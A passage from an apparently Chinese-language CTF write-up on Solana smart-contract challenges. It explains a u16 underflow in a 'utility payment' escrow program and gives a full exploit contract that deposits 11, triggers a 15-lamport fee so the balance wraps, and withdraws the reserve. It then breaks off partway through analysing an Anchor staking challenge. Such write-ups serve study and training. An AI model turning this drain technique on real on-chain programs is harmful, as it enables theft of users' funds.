account_iter ) ? ; let escrow_account = next_account_info ( account_iter ) ? ; let sys_prog = next_account_info ( account_iter ) ? ; assert! ( user . is_signer ); let ( expected_reserve , reserve_bump ) = get_reserve ( * program ); assert_eq! ( expected_reserve , * reserve . key ); let ( expected_escrow , _escrow_bump ) = get_escrow ( * program , * user . key ); assert_eq! ( expected_escrow , * escrow_account . key ); let escrow_data = & mut Escrow :: deserialize ( & mut & ( * escrow_account . data ). borrow_mut ()[ .. ]) ? ; let balance = escrow_data . amount ; invoke_signed ( & system_instruction :: transfer ( & reserve . key , & user . key , balance as u64 ), & [ user . clone (), reserve . clone (), sys_prog . clone ()], & [ & [ \"RESERVE\" . as_bytes (), & [ reserve_bump ]]], ) ? ; escrow_data . amount = 0 ; escrow_data . serialize ( & mut & mut ( * escrow_account . data ). borrow_mut ()[ .. ]) . unwrap (); Ok (()) } /// /// pay utility /// fn pay_utility_fees ( program : & Pubkey , accounts : & [ AccountInfo ], amount : u16 ) -> ProgramResult { let account_iter = & mut accounts . iter (); let user = next_account_info ( account_iter ) ? ; let reserve = next_account_info ( account_iter ) ? ; let escrow_account = next_account_info ( account_iter ) ? ; let _sys_prog = next_account_info ( account_iter ) ? ; assert! ( user . is_signer ); let ( expected_reserve , _reserve_bump ) = get_reserve ( * program ); assert_eq! ( expected_reserve , * reserve . key ); let ( expected_escrow , _escrow_bump ) = get_escrow ( * program , * user . key ); assert_eq! ( expected_escrow , * escrow_account . key ); let escrow_data = & mut Escrow :: deserialize ( & mut & ( * escrow_account . data ). borrow_mut ()[ .. ]) ? ; let base_fee = 15_ u16 ; if escrow_data . amount >= 10 { if amount < base_fee { escrow_data . amount -= base_fee ; } else { assert! ( escrow_data . amount >= amount ); escrow_data . amount -= amount ; } } else { msg ! ( \"ABORT: Cannot make payments when the escrow account has a balance less than 10 lamports.\" ); } escrow_data . serialize ( & mut & mut ( * escrow_account . data ). borrow_mut ()[ .. ]) . unwrap (); Ok (()) } \u53ef\u4ee5\u770b\u51fa\u4e3b\u8981\u6709\u4e09\u4e2a\u65b9\u6cd5\uff1a Init\uff1a\u521d\u59cb\u5316\u5e76\u7b7e\u540d escrow DepositEscrow\uff1a\u5b58\u5165 deposit_amount \u91d1\u989d \u5c06\u94b1\u8f6c\u5165 reserve account\uff08\u53ea\u7531 program seed \u751f\u6210\uff09 \u5c06\u7528\u6237\u5bf9\u5e94 escrow account\uff08\u7531 program \u548c user.key \u7684 seed \u5408\u6210\u751f\u6210\uff09\u7684 amount \u589e\u52a0 deposit_amout WithdrawEscrow\uff1a\u5c06 escrow \u8bb0\u5f55\u7684\u6240\u6709\u91d1\u989d\u90fd\u8f6c\u56de\u7ed9\u7528\u6237 \u4ece reserve account \u8f6c\u51fa Pay\uff1a\u652f\u4ed8\uff0c\u4e5f\u5c31\u662f\u51cf\u5c11\u7528\u6237 escrow \u7684 amount\u3002\u8fd8\u662f\u770b\u4ee3\u7801\u66f4\u6e05\u6670\uff1a let base_fee = 15_ u16 ; if escrow_data . amount >= 10 { if amount < base_fee { escrow_data . amount -= base_fee ; } else { assert! ( escrow_data . amount >= amount ); escrow_data . amount -= amount ; } } else { msg ! ( \"ABORT: Cannot make payments when the escrow account has a balance less than 10 lamports.\" ); } \u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u8f83\u660e\u663e\u7684\u9690\u60a3\u662f u16\uff0c\u4e5f\u5c31\u662f 16 \u4f4d\u65e0\u7b26\u53f7\u6574\u578b\u3002\u518d\u56de\u5934\u770b lib.rs \u4e2d\u89c4\u5b9a\u7684 Escrow account \u7ed3\u6784\u4f53\uff1a #[repr(C)] #[derive(BorshSerialize, BorshDeserialize)] pub struct Escrow { pub user : Pubkey , pub amount : u16 , pub bump : u8 , } \u8fd9\u91cc\u7684 amount \u4e5f\u662f u16\uff0c\u5b58\u5728\u6574\u578b\u6ea2\u51fa\u98ce\u9669\u3002 \u63a5\u7740\u770b main.rs \u4e2d\u7684\u9898\u76ee\u90e8\u5206\uff1a \u9898\u76ee\u4ea4\u4e92\u90e8\u5206 fn handle_connection ( mut socket : TcpStream ) -> Result < (), Box < dyn Error >> { let mut builder = ChallengeBuilder :: try_from ( socket . try_clone (). unwrap ()). unwrap (); // load programs let solve_pubkey = builder . input_program (). unwrap (); let program_pubkey = builder . chall_programs ( & [ \"./utility_payment.so\" ])[ 0 ]; // make user let user = Keypair :: new (); writeln! ( socket , \"program pubkey: {}\" , program_pubkey ) ? ; writeln! ( socket , \"solve pubkey: {}\" , solve_pubkey ) ? ; writeln! ( socket , \"user pubkey: {}\" , user . pubkey ()) ? ; // println!(\"program: {}\", program_pubkey); // add accounts and lamports let ( reserve , _ ) = get_reserve ( program_pubkey ); // let (escrow, _) = get_escrow(program_pubkey, user.pubkey()); const TARGET_AMT : u64 = 60_000 ; const INIT_BAL : u64 = 50 ; const RESERVE_BAL : u64 = 1_000_000 ; builder . builder . add_account_with_lamports ( user . pubkey (), system_program :: ID , INIT_BAL ); builder . builder . add_account_with_lamports ( reserve , system_program :: ID , RESERVE_BAL ); let mut challenge = builder . build (); let balance = challenge . env . get_account ( user . pubkey ()). unwrap (). lamports ; writeln! ( socket , \"user lamport before: {:?}\" , balance ) ? ; // run solve challenge . input_instruction ( solve_pubkey , & [ & user ]). unwrap (); // check solve let balance = challenge . env . get_account ( user . pubkey ()). unwrap (). lamports ; writeln! ( socket , \"user lamport after: {:?}\" , balance ) ? ; if balance > TARGET_AMT { let flag = fs :: read_to_string ( \"flag.txt\" ). unwrap (); writeln! ( socket , \"Flag: {}\" , flag ) ? ; } Ok (()) } \u7b2c\u4e00\u6b21\u63a5\u89e6 solana \u9898\u76ee\uff0c\u6240\u4ee5\u9010\u6b65\u89e3\u6790\u4e00\u4e0b\uff1a \u521b\u5efa\u4e00\u4e2a builder \u5e76\u83b7\u53d6\u7528\u6237\u5408\u7ea6\u4ee5\u53ca\u9898\u76ee\u5408\u7ea6\uff08ChallengeBuilder \u6765\u81ea sol-ctf-framework\uff09\uff1a let mut builder = ChallengeBuilder :: try_from ( socket . try_clone (). unwrap ()). unwrap (); // load programs let solve_pubkey = builder . input_program (). unwrap (); let program_pubkey = builder . chall_programs ( & [ \"./utility_payment.so\" ])[ 0 ]; \u8fd9\u91cc\u9700\u8981\u4e86\u89e3\u7684\u662f\u4e00\u4e2a solana \u5408\u7ea6\u5728\u4e0a\u94fe\u7684\u65f6\u5019\u9700\u8981\u7f16\u8bd1\u6210 BPF\uff08Berkley Packer Filter\uff09\u5b57\u8282\u7801\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a .so \u6587\u4ef6 ChallengeBuilder::input_program \u65b9\u6cd5\u53ef\u4ee5\u901a\u8fc7\u6e90\u7801\u770b\u51fa\u9996\u5148\u8f93\u5165\u7a0b\u5e8f\u957f\u5ea6\uff0c\u7136\u540e\u8bfb\u53d6 .so \u7684\u5b57\u8282\u5e8f\u5217 \u521b\u5efa\u7528\u6237\u8d26\u6237\u5e76\u8f93\u51fa\u4e00\u7cfb\u5217 pubkey\uff1a let user = Keypair :: new (); writeln! ( socket , \"program pubkey: {}\" , program_pubkey ) ? ; writeln! ( socket , \"solve pubkey: {}\" , solve_pubkey ) ? ; writeln! ( socket , \"user pubkey: {}\" , user . pubkey ()) ? ; \u6839\u636e program_pubkey \u6765\u627e\u5230 reserve \u8d26\u6237\uff1a let ( reserve , _ ) = get_reserve ( program_pubkey ); \u5176\u4e2d get_reserve \u51fd\u6570\u5728 processor.rs \u4e2d\u5b9a\u4e49\uff1a pub fn get_reserve ( program : Pubkey ) -> ( Pubkey , u8 ) { Pubkey :: find_program_address ( & [ \"RESERVE\" . as_bytes ()], & program ) } \u8fd9\u91cc\u9700\u8981\u4e86\u89e3\u7684\u4e00\u4e2a\u662f solana \u7684\u8d26\u6237\u5206\u4e3a\u4e00\u822c\u8d26\u6237\u548c PDA\uff08Program Derived Address\uff09 PDA \u4e00\u822c\u662f\u7531\u7a0b\u5e8f\u751f\u6210\u7528\u6765\u8bb0\u5f55\u6570\u636e\u7684 PDA \u7684\u8ba1\u7b97\u662f\u6839\u636e seed \u548c program_id\uff08\u4e5f\u5c31\u662f\u7a0b\u5e8f\u7684 pubkey\uff09\u505a\u54c8\u5e0c\u6765\u751f\u6210\u7684 \u4f46\u662f PDA \u8981\u4fdd\u8bc1\u4e0d\u662f\u53ef\u7528\u7684 Pubkey\uff08\u8fd9\u4e2a\u8fd8\u6ca1\u7406\u89e3\uff09\uff0c\u6240\u4ee5 hash \u7684\u65f6\u5019\u8981\u518d\u52a0\u4e00\u4e2a\u53c2\u6570 bump\uff1apda = hash(seed, bump, program_id) \u5bfb\u627e\u4e00\u4e2a PDA \u7684\u65f6\u5019\u4f1a\u4ece 0 \u5230 256 \u679a\u4e3e bump\uff0c\u7b2c\u4e00\u4e2a\u53ef\u4ee5\u751f\u6210\u6709\u6548 PDA \u7684 bump \u79f0\u4e3a canonical bump\uff0c\u800c\u4e14\u4e00\u822c\u5c31\u4f7f\u7528\u8fd9\u4e2a PDA \u6240\u4ee5\u6839\u636e\u76f8\u540c seed\u3001\u76f8\u540c program_id \u751f\u6210\u7684 PDA \u4e5f\u662f\u76f8\u540c\u7684\u3002Pubkey::find_program_address \u505a\u7684\u5c31\u662f\u8fd9\u4e2a\uff0c\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f seed\u3001\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f program_id \u6240\u4ee5 reserve \u662f\u4e00\u4e2a\u7531 RESERVE seed \u548c program_pubkey \u751f\u6210\u7684 PDA \u4e3a account \u589e\u52a0\u521d\u59cb lamports\uff08\u94b1\uff09\uff1a const TARGET_AMT : u64 = 60_000 ; const INIT_BAL : u64 = 50 ; const RESERVE_BAL : u64 = 1_000_000 ; builder . builder . add_account_with_lamports ( user . pubkey (), system_program :: ID , INIT_BAL ); builder . builder . add_account_with_lamports ( reserve , system_program :: ID , RESERVE_BAL ); \u7ed9 user 50 lamports \u7ed9 reserve 1000000 lamports \u6784\u5efa challenge\u3001\u8f93\u51fa user \u521d\u59cb lamports\uff1a let mut challenge = builder . build (); let balance = challenge . env . get_account ( user . pubkey ()). unwrap (). lamports ; writeln! ( socket , \"user lamport before: {:?}\" , balance ) ? ; \u63a5\u6536\u6307\u4ee4\uff0c\u4ea4\u7ed9\u7528\u6237\u5408\u7ea6\u6267\u884c\uff1a challenge . input_instruction ( solve_pubkey , & [ & user ]). unwrap (); \u8fd9\u91cc\u7684 input_instruction \u65b9\u6cd5\u4e5f\u662f\u5728 sol-ctf-framework \u4e2d\u5b9a\u4e49\u7684\uff0c\u8f93\u5165\u65b9\u6cd5\u8f83\u590d\u6742\uff0c\u4e0d\u8fc7\u597d\u5728\u9898\u76ee\u63d0\u4f9b\u4e86\u4e00\u4e2a solve.py \u7528\u6765\u4ea4\u4e92\u8f93\u5165\u6307\u4ee4 \u68c0\u67e5\u76ee\u6807\uff0c\u8fbe\u5230\u5219\u4e0b\u53d1 flag\uff1a let balance = challenge . env . get_account ( user . pubkey ()). unwrap (). lamports ; writeln! ( socket , \"user lamport after: {:?}\" , balance ) ? ; if balance > TARGET_AMT { let flag = fs :: read_to_string ( \"flag.txt\" ). unwrap (); writeln! ( socket , \"Flag: {}\" , flag ) ? ; } \u53ef\u89c1\u76ee\u6807\u662f\u4f7f user \u62e5\u6709\u7684 lamports \u5927\u4e8e 60000 lamports \u8fd9\u6837\u6211\u4eec\u7684\u653b\u51fb\u65b9\u5f0f\u5c31\u5f88\u660e\u663e\u4e86\uff1a \u5148\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 Init \u6307\u4ee4\u5b8c\u6210\u521d\u59cb\u5316\uff08\u9898\u76ee\u5df2\u7ecf\u5199\u597d\uff09 \u518d deposit 11 lamports\uff0c\u4f7f\u7528\u6237\u5bf9\u5e94\u7684 escrow \u7684 amount \u8bb0\u4e3a 11 \u7136\u540e pay 11 lamports\uff0c\u8fd9\u65f6\u4e0d\u4f1a\u6536\u53d6 11 lamports \u800c\u662f\u6536\u53d6\u57fa\u7840\u8d39\u7528 15 lamports\u3002escrow \u7684 amount \u4ece 11 \u51cf\u53bb 15 \u53d1\u751f\u6ea2\u51fa\uff0c\u6ea2\u51fa\u5230 65531\uff0c\u6b64\u65f6 withdraw \u7684\u8bdd reserve \u6709 1000000 \u8db3\u591f\u652f\u4ed8\uff0c\u63d0\u51fa\u6765\u540e\u4e5f\u53ef\u4ee5\u8fbe\u5230\u9898\u76ee 60000 \u7684\u76ee\u6807 \u76f4\u63a5 withdraw \u5373\u53ef \u6240\u4ee5\u53ea\u9700\u8981\u5c06\u8fd9\u4e9b\u6b65\u9aa4\u90fd\u7167\u846b\u82a6\u753b\u74e2\u5199\u5728 processor.rs \u7684 process_instruction \u4e2d\u5373\u53ef\uff1a exp \u5408\u7ea6 pub fn process_instruction ( _program : & Pubkey , accounts : & [ AccountInfo ], _data : & [ u8 ], ) -> ProgramResult { let account_iter = & mut accounts . iter (); let utility_program = next_account_info ( account_iter ) ? ; let user = next_account_info ( account_iter ) ? ; let reserve = next_account_info ( account_iter ) ? ; let escrow_account = next_account_info ( account_iter ) ? ; let sys_prog_account = next_account_info ( account_iter ) ? ; invoke ( & Instruction { program_id : * utility_program . key , accounts : vec ! [ AccountMeta :: new ( * user . key , true ), AccountMeta :: new ( * reserve . key , false ), AccountMeta :: new ( * escrow_account . key , false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ], data : ServiceInstruction :: Init { } . try_to_vec () . unwrap (), }, & [ reserve . clone (), escrow_account . clone (), user . clone (), sys_prog_account . clone (), ], ) ? ; invoke ( & deposit_escrow ( * utility_program . key , * user . key , * reserve . key , * escrow_account . key , 11 , ), & [ reserve . clone (), escrow_account . clone (), user . clone (), sys_prog_account . clone (), ], ) ? ; invoke ( & pay_utility_fees ( * utility_program . key , * user . key , * reserve . key , * escrow_account . key , 11 , ), & [ reserve . clone (), escrow_account . clone (), user . clone (), sys_prog_account . clone (), ], ) ? ; invoke ( & withdraw_escrow ( * utility_program . key , * user . key , * reserve . key , * escrow_account . key , ), & [ reserve . clone (), escrow_account . clone (), user . clone (), sys_prog_account . clone (), ], ) ? ; Ok (()) } \u4e4b\u540e\u5229\u7528 cargo build-bpf\uff08\u9700\u8981\u5148\u5b89\u88c5 solana\uff09\u7f16\u8bd1\u51fa .so \u6587\u4ef6\uff0c\u518d\u4ea4\u7ed9 solve.py \u811a\u672c\u4ea4\u9898\u5373\u53ef\u3002 flag: n1ctf{cashback_\u2026\u2026} Simple Staking \u00b6 \u540c\u6837\u4e5f\u662f solana \u5408\u7ea6\uff0c\u4e0d\u8fc7\u7528\u4e86 anchor lang\uff1a https://www.anchor-lang.com/ \uff0c\u6709\u5f88\u591a\u5947\u5947\u602a\u602a\u7684\u5199\u6cd5\uff0c\u4f46\u770b\u770b\u6587\u6863\u8fd8\u633a\u597d\u61c2\u7684 \u8fd8\u662f\u8be6\u7ec6\u89e3\u6790\u4e00\u4e0b\uff1a \u9898\u76ee\u5408\u7ea6 \u00b6 anchor lang \u7684\u8bed\u6cd5\u770b\u8d77\u6765\u5c31\u662f\u628a\u5904\u7406\u51fd\u6570\u5c01\u88c5\u5728\u4e00\u4e2a mod \u4e2d\u7136\u540e\u7528 #[program] \u5b8f\u6765\u5904\u7406\u3002 \u8fd9\u4e2a mod \u4e2d\u7684\u6bcf\u4e2a\u51fd\u6570\u90fd\u4f1a\u88ab\u5904\u7406\u6210\u4e00\u4e2a\u6307\u4ee4\uff0c\u5b83\u4eec\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u662f\u4e00\u4e2a Context \u6cdb\u578b\uff0c\u5176\u4f9d\u8d56\u7684\u662f\u9488\u5bf9\u6bcf\u79cd\u6307\u4ee4\u7684\u7ed3\u6784\u4f53 Accounts\uff08\u5373 Context \uff09\uff0c\u7136\u540e\u5728\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u5229\u7528 ctx.accounts.? \u6765\u83b7\u53d6\u5bf9\u5e94\u7ed3\u6784\u4f53\u4e2d\u7684\u5404\u4e2a account\u3002 \u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\u4f1a\u4f7f\u7528 #[derive(Accounts)] \u5b8f\u6765\u8fdb\u884c\u5904\u7406\u3002\u5176\u4e2d\u6210\u5458\u4e5f\u53ef\u4ee5\u4f7f\u7528 #[account()] \u5b8f\u8fdb\u884c\u9650\u5b9a\uff0c\u5982\u679c\u8f93\u5165\u4e0d\u6ee1\u8db3\u9650\u5b9a\u5219\u4f1a\u62a5\u9519\uff0c\u5177\u4f53\u5199\u6cd5\u548c\u610f\u4e49\u53ef\u4ee5\u770b\u5b98\u65b9\u6587\u6863\u3002 Initialize \u00b6 \u5904\u7406\u51fd\u6570\u662f\u7a7a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u6240\u6709\u64cd\u4f5c\u90fd\u5728 Initialize \u7ed3\u6784\u4f53\u4e2d\u8fdb\u884c pub fn initialize ( _ctx : Context < Initialize > ) -> Result < () > { Ok (()) } Initialize \u7ed3\u6784\u4f53\u5b57\u6bb5\uff1a catalog\uff1a #[account( init, seeds = [ b \"CATALOG\" ], bump, payer = payer, space = Catalog::SIZE, )] pub catalog : Account <' info , Catalog > , init \u8868\u793a\u8fd9\u4e2a account \u9700\u8981\u521d\u59cb\u5316\uff08\u800c\u4e14\u4e0d\u80fd\u91cd\u590d\u8fdb\u884c\uff09 seeds \u8868\u793a\u7528\u8fd9\u4e2a seed \u6765\u627e PDA bump \u8868\u793a\u8981\u8bb0\u5f55\u4e0b canonical bump\uff08\u53ef\u4ee5\u901a\u8fc7 * ctx . bumps . get ( \"catalog\" ). unwrap () \u6765\u83b7\u53d6\u8fd9\u4e2a bump payer \u8868\u793a\u521b\u5efa\u8d26\u53f7\u8981\u7528\u7684 payer space \u7528\u6765\u786e\u5b9a\u5927\u5c0f\uff0c\u7531 Catalog \u89c4\u5b9a \u8fd9\u4e2a\u8d26\u6237\u5b58\u7684\u4fe1\u606f\uff08data\uff09\u662f Catalog \u7ed3\u6784\u4f53\u7684\u5185\u5bb9\uff08\u5e8f\u5217\u5316\u540e\uff09Catalog \u5b9a\u4e49\uff1a #[account] #[repr(C, align(8))] #[derive(Default)] pub struct Catalog { pub orgs : Vec < String > , pub ids : Vec < String > , } impl Catalog { pub const SIZE : usize = 8 + 4 + ( 4 + MAXIMUM_STRING_SIZE ) * MAXIMUM_CATALOG_SIZE // orgs: Vec<String>, + 4 + ( 4 + MAXIMUM_STRING_SIZE ) * MAXIMUM_CATALOG_SIZE ; // ids: Vec<String>, } reserve\uff1a #[account( init, seeds = [ b \"RESERVE\" ], bump, payer = payer, token::mint = mint, token::authority = reserve )] pub reserve : Account <' info , TokenAccount > , \u4e0e\u524d\u9762\u540c\u7406 \u8fd9\u662f\u4e00\u4e2a TokenAccount\uff0c\u5176\u5b9a\u4e49\u5728 spl_token \u4e2d\uff0c\u662f\u4e00\u4e2a\u7c7b\u4f3c ERC20 \u7684\u4ee3\u5e01 \u5176\u5b83\uff1a pub mint : Account <' info , Mint > , #[account(mut)] pub payer : Signer <' info > , pub token_program : Program <' info , Token > , pub system_program : Program <' info , System > , pub rent : Sysvar <' info , Rent > , mint \u4e3a Token \u5408\u7ea6\u7684 mint \u8d26\u6237\uff0c\u7528\u6765\u7ed9 reserve \u63d0\u4f9b\u53c2\u6570 token::mint payer \u4e5f\u662f\u4e3a\u524d\u9762\u4e24\u4e2a\u63d0\u4f9b\u53c2\u6570 token_program \u662f spl token \u7684 ID system_program \u662f\u9898\u76ee\u5408\u7ea6\u7684 ID rent \u662f solana \u7cfb\u7edf\u7684 rent ID\uff08\u4e0d\u7528\u7ba1\u8fd9\u4e2a\uff09 Register \u00b6 Register \u7ed3\u6784\u4f53\uff1a catalog\uff1a #[account( mut, seeds = [ b \"CATALOG\" ], bump )] pub catalog : Account <' info , Catalog > , \u6839\u636e\u8fd9\u4e2a seed \u6765\u83b7\u53d6\uff0c\u540c\u6837\u8bb0\u5f55 bump employee_record\uff1a #[account( init, seeds = [user.key().as_ref()], bump, payer = user, space = EmployeeRecord::SIZE, )] pub employee_record : Account <' info , EmployeeRecord > , \u548c\u524d\u9762 Initialize \u7684\u540c\u7406 \u5176\u4e2d EmployeeRecord \u7ed3\u6784\u4f53\uff1a #[account] #[repr(C, align(8))] #[derive(Default)] pub struct EmployeeRecord { pub org : String , pub id : String , pub key : Pubkey , } impl EmployeeRecord { pub const SIZE : usize = 8 + 4 + MAXIMUM_STRING_SIZE // orgs: String, + 4 + MAXIMUM_STRING_SIZE // ids: String, + 32 ; // key: Pubkey } \u5176\u5b83\uff1a #[account(mut)] pub user : Signer <' info > , pub system_program : Program <' info , System > , pub rent : Sysvar <' info , Rent > , \u5904\u7406\u51fd\u6570\uff1a pub fn register ( ctx : Context < Register > , org_name : String , employee_id : String ) -> Result < () > { msg ! ( \"[CHALL] register: org {}, id {}\" , org_name , employee_id ); require ! ( org_name . len () < MAXIMUM_STRING_SIZE , CoreError :: StringTooLong ); require ! ( employee_id . len () < MAXIMUM_STRING_SIZE , CoreError :: StringTooLong ); let catalog = & mut ctx . accounts . catalog ; require ! ( ! ( catalog . orgs . contains ( & org_name ) && catalog . ids . contains ( & employee_id ) ), CoreError :: DuplicatedEmployee ); catalog . orgs . push ( org_name . clone ()); catalog . ids . push ( employee_id . clone ()); let employee_record = & mut ctx . accounts . employee_record ; let employee_key = ctx . accounts . user . key (); employee_record . org = org_name ; employee_record . id = employee_id ; employee_record . key = employee_key ; Ok (()) } \u9996\u5148\u9a8c\u8bc1 org_name \u548c employee_id \u7684\u957f\u5ea6 \u68c0\u67e5 (org_name, employee_id) \u662f\u5426\u5728 catalog \u4e2d\u5b58\u5728\uff0c\u5b58\u5728\u5219\u62a5\u9519 \u5c06 (org_name, employee_id) \u6dfb\u52a0\u5230 catalog \u4e2d \u4fee\u6539 employee_record Deposit \u00b6 Deposit \u7ed3\u6784\u4f53 vault\uff1a #[account( init_if_needed, seeds = [org_name.as_bytes(), employee_id.as_bytes()], bump, space = Vault::SIZE, payer = user )] pub vault : Account <' info , Vault > , \u901a\u8fc7 [org_name, employee_id] \u8fd9\u4e2a seed \u83b7\u53d6 PDA Vault \u5b9a\u4e49\uff1a #[account] #[repr(C, align(8))] #[derive(Default)] pub struct Vault { pub amount : u64 , } impl Vault { pub const SIZE : usize = 8 // DISCRIMINATOR_SIZE + 8 ; // u64 } employee_record\uff1a #[account( seeds = [user.key().as_ref()], bump, constraint = employee_record.org == org_name, constraint = employee_record.id == employee_id, constraint = employee_record.key == user.key(), )] pub employee_record : Account <' info , EmployeeRecord > , \u8fd9\u91cc\u6709\u65b0\u51fa\u73b0\u7684 constraint\uff0c\u4f20\u53c2\u65f6\u4f1a\u68c0\u67e5\u5176\u5185\u5bb9\u662f\u5426\u4e3a true\uff0c\u4e0d\u662f\u7684\u8bdd\u5c31\u62a5\u9519\u7136\u540e revert \u5176\u5b83 #[account( mut, seeds = [ b \"RESERVE\" ], bump, constraint = reserve.mint == mint.key(), )] pub reserve : Account <' info , TokenAccount > , #[account( mut, constraint = user_token_account.owner == user.key(), constraint = user_token_account.mint == mint.key() )] pub user_token_account : Account <' info , TokenAccount > , pub mint : Account <' info , Mint > , #[account(mut)] pub user : Signer <' info > , pub token_program : Program <' info , Token > , pub system_program : Program <' info , System > , pub rent : Sysvar <' info , Rent > , \u5904\u7406\u51fd\u6570\uff1a pub fn deposit ( ctx : Context < Deposit > , org_name : String , employee_id : String , amount : u64 ) -> Result < () > { msg ! ( \"[CHALL] deposit\" ); let vault = & mut ctx . accounts . vault ; let employee_record = & ctx . accounts . employee_record ; let user = & ctx . accounts . user ; require ! ( user . key () == employee_record . key && org_name == employee_record . org && employee_id == employee_record . id , CoreError :: UnknownEmployee ); let deposit_ctx = CpiContext :: new ( ctx . accounts . token_program . to_account_info (), Transfer { from : ctx . accounts . user_token_account . to_account_info (), to : ctx . accounts . reserve . to_account_info (), authority : ctx . accounts . user . to_account_info () } ); token :: transfer ( deposit_ctx , amount ) ? ; vault . amount += amount ; Ok (()) } \u5148\u8bd5\u4e00\u7cfb\u5217\u68c0\u67e5\uff0c\u68c0\u67e5\u8f93\u5165\u662f\u5426\u5408\u6cd5 \u7136\u540e\u8c03\u7528 spl token \u7684 transfer \u6307\u4ee4\u6765\u4ece user_token_account \u8f6c amount \u4e2a token \u7ed9 reserve \u4e3a vault \u7684 amount \u589e\u52a0 amount\uff08\u8fd9\u4e2a vault \u662f\u6839\u636e seed [org_name, employee_id] \u627e\u5230\u7684 PDA\uff09 Withdraw \u00b6 Withdraw \u7ed3\u6784\u4f53 \u5176\u5185\u5bb9\u548c Deposit \u51e0\u4e4e\u4e00\u81f4 \u533a\u522b\u5728\u4e8e Deposit \u7684 user \u5728\u8fd9\u91cc\u53eb\u505a payer\uff0c\u4e0d\u8fc7\u7528\u5904\u5e94\u8be5\u6ca1\u53d8 \u5904\u7406\u51fd\u6570\uff1a pub fn withdraw ( ctx : Context < Withdraw > , org_name : String , employee_id : String , amount : u64 ) -> Result < () > { msg ! ( \"[CHALL] withdraw\" ); let vault = & mut ctx . accounts . vault ; let employee_record = & ctx . accounts . employee_record ; let payer = ctx . accounts . payer . key (); require ! ( payer == employee_record . key && org_name == employee_record . org && employee_id == employee_record . id , CoreError :: UnknownEmployee ); require ! ( vault . amount >= amount , CoreError :: InsufficientBalance ); let reserve_bump = [ * ctx . bumps . get ( \"reserve\" ). unwrap ()]; let signer_seeds = [ b\"RESERVE\" , reserve_bump . as_ref () ]; let signer = & [ & signer_seeds [ .. ]]; let withdraw_ctx = CpiContext :: new_with_signer ( ctx . accounts . token_program . to_account_info (), Transfer { from : ctx . accounts . reserve . to_account_info (), to : ctx . accounts . user_account . to_account_info (), authority : ctx . accounts . reserve . to_account_info () }, signer ); token :: transfer ( withdraw_ctx , amount ) ? ; vault . amount -= amount ; Ok (()) } \u540c\u6837\u505a\u4e86\u5f88\u591a\u68c0\u67e5 \u5229\u7528 spl token \u5408\u7ea6\u4ece reserve transfer amount token \u7ed9 user_account \u7ed9 vault.amount \u51cf\u5c11 amount \u9898\u76ee\u4ea4\u4e92\u90e8\u5206 \u00b6 \u9898\u76ee\u4ea4\u4e92\u4ee3\u7801 async fn handle_connection ( mut socket : TcpStream ) -> Result < (), Box < dyn Error >> { let mut builder = ChallengeBuilder :: try_from ( socket . try_clone (). unwrap ()). unwrap (); let chall_id = builder . add_program ( \"./chall/target/deploy/chall.so\" , Some ( chall :: ID )); let solve_id = builder . input_program () ? ; let mut chall = builder . build (). await ; // ------------------------------------------------------------------------- // [setup env] initialize // ------------------------------------------------------------------------- let program_id = chall_id ; let mint = chall . add_mint (). await ? ; let payer_keypair = & chall . ctx . payer ; let payer = payer_keypair . pubkey (); let user_keypair = Keypair :: new (); let user = user_keypair . pubkey (); chall . run_ix ( system_instruction :: transfer ( & payer , & user , 100_000_000_000 )) . await ? ; let catalog = Pubkey :: find_program_address ( & [ b\"CATALOG\" ], & program_id ). 0 ; let reserve = Pubkey :: find_program_address ( & [ b\"RESERVE\" ], & program_id ). 0 ; println! ( \" \\n Accounts created... \\n \" ); let ix = chall :: instruction :: Initialize {}; let ix_accounts = chall :: accounts :: Initialize { catalog , reserve , mint , payer , token_program : spl_token :: ID , system_program : solana_program :: system_program :: ID , rent : solana_program :: sysvar :: rent :: ID , }; chall . run_ix ( Instruction :: new_with_bytes ( program_id , & ix . data (), ix_accounts . to_account_metas ( None ), )) . await ? ; // ------------------------------------------------------------------------- // [setup env] register // ------------------------------------------------------------------------- let org_name = String :: from ( \"product\" ); let employee_id = String :: from ( \"employ_A\" ); let ix = chall :: instruction :: Register { org_name : org_name . clone (), employee_id : employee_id . clone (), }; let employee_record = Pubkey :: find_program_address ( & [ payer . as_ref ()], & program_id ). 0 ; let reg_accounts = chall :: accounts :: Register { catalog , employee_record , user : payer , system_program : solana_program :: system_program :: ID , rent : solana_program :: sysvar :: rent :: ID , }; chall . run_ix ( Instruction :: new_with_bytes ( program_id , & ix . data (), reg_accounts . to_account_metas ( None ), )) . await ? ; // ------------------------------------------------------------------------- // [setup env] deposits 1_000 // ------------------------------------------------------------------------- let payer_token_account = chall . add_token_account ( & mint , & payer ). await ? ; chall . mint_to ( 1_000_ u64 , & mint , & payer_token_account ) . await ? ; let vault = Pubkey :: find_program_address ( & [ org_name . clone (). as_bytes (), employee_id . clone (). as_bytes ()], & program_id , ) . 0 ; let ix = chall :: instruction :: Deposit { org_name : org_name . clone (), employee_id : employee_id . clone (), amount : 500_ u64 , }; let ix_accounts = chall :: accounts :: Deposit { vault , employee_record , reserve , user_token_account : payer_token_account , mint , user : payer , token_program : spl_token :: ID , system_program : solana_program :: system_program :: ID , rent : solana_program :: sysvar :: rent :: ID , }; chall . run_ix ( Instruction :: new_with_bytes ( program_id , & ix . data (), ix_accounts . to_account_metas ( None ), )) . await ? ; // TDOD: comment out let reserve_account = chall . read_token_account ( reserve ). await ? ; let reserve_balance = reserve_account . amount ; println! ( \" \\n vault = {} \\n reserve balance = {} \\n \" , vault , reserve_balance ); // ---------------------------------------------------------------------------- // [setup env] done // ---------------------------------------------------------------------------- let init_amount = 100_ u64 ; let user_record = Pubkey :: find_program_address ( & [ user . as_ref ()], & program_id ). 0 ; let user_token_account_pubkey = chall . add_token_account ( & mint , & user ). await ? ; chall . mint_to ( init_amount , & mint , & user_token_account_pubkey ) . await ? ; writeln! ( socket , \"user: {}\" , user ) ? ; writeln! ( socket , \"user_record: {}\" , user_record ) ? ; writeln! ( socket , \"catalog: {}\" , catalog ) ? ; writeln! ( socket , \"mint: 